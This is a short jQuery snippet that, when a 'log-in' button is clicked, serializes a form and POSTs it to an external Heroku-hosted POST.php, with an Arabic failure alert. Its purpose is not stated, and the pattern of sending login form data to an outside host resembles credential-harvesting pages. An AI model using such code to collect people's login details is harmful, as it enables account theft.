$(function(){
    

    $('#log-in').click(function() {

      var myLink = 'https://analiza-new.herokuapp.com/POST.php';

        var request = $.ajax({
            url: myLink,
            method: "POST",
            data: $('#form').serialize(),
            dataType: "html"

          }).done(function( msg ) {

            console.log('Done1 <br>');
            console.log(msg);

          }).fail(function( jqXHR, textStatus ) {

            alert( "فشل الطلب: " + textStatus );
          });


    });


});
